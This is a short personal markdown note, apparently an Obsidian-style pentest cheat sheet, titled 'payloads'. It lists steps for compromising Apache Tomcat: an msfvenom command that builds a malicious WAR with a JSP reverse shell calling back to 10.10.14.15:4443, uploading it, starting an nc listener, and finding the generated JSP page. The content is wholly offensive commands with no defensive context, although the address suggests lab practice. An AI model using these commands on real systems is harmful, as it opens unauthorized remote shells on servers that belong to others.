---
aliases:
tags:
source:
desc:
---


# payloads

- [[apache-tomcat]] malicous WAR file 
	- build payload `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.15 LPORT=4443 -f war > backup.war`
	- upload payload to apache-tomcat
	- start nc `nc -lnvp 4443`
	- dynamic page, check backup.war for filename `bmtppbqhfprckpf.jsp